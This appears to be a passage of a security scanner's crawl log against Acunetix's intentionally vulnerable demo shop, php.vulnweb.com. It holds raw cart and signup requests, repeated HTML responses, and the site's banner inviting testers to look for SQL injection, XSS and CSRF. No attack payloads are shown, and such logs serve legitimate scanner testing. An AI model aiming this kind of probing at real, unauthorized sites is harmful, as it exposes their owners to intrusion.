			<tr><td valign="top">Phone number:</td><td><input type="text" name="uphone" style="width:200px"></td></tr>
			<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px"></textarea></td></tr>
			<tr><td colspan="2" align="right"><input type="submit" value="signup" name="signup"></td></tr>
		</table>
	</form>
</div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6033</Value></Header></Headers><SetCookies /><Forms><Form><Action>/secured/newuser.php</Action><Method>post</Method><Name>form1</Name><OnSubmit /><InputFields><InputField><Name>uuname</Name><Value /><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>upass</Name><Value /><Size /><MaxLength>0</MaxLength><sType>password</sType><Class /></InputField><InputField><Name>upass2</Name><Value /><Size /><MaxLength>0</MaxLength><sType>password</sType><Class /></InputField><InputField><Name>urname</Name><Value /><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>ucc</Name><Value /><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uemail</Name><Value /><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uphone</Name><Value /><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>signup</Name><Value>signup</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>uaddress</Name><Value /><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="315CA848962ECA0FF0E0E3C8A9288650"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="315CA848962ECA0FF0E0E3C8A9288650"><![CDATA[POST /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="315CA848962ECA0FF0E0E3C8A9288650";PSID="DAA15E1D8773467EA7B95E6749B18163";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="33377494";
X-Request-Memo: ID="121d7399";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

price=500&addcart=1]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="315CA848962ECA0FF0E0E3C8A9288650"><Method>POST</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>price=500&amp;addcart=1</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=1</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>19</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="315CA848962ECA0FF0E0E3C8A9288650";PSID="DAA15E1D8773467EA7B95E6749B18163";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="33377494";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="121d7399";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="1EEEA0D97854386FA6E7E12BF372BE63"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="1EEEA0D97854386FA6E7E12BF372BE63"><![CDATA[POST /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="1EEEA0D97854386FA6E7E12BF372BE63";PSID="5F9905BD02E1BB70F1922374691D86AB";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="92cff355";
X-Request-Memo: ID="58332442";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

price=800&addcart=2]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="1EEEA0D97854386FA6E7E12BF372BE63"><Method>POST</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>price=800&amp;addcart=2</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=2</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>19</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="1EEEA0D97854386FA6E7E12BF372BE63";PSID="5F9905BD02E1BB70F1922374691D86AB";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="92cff355";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="58332442";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
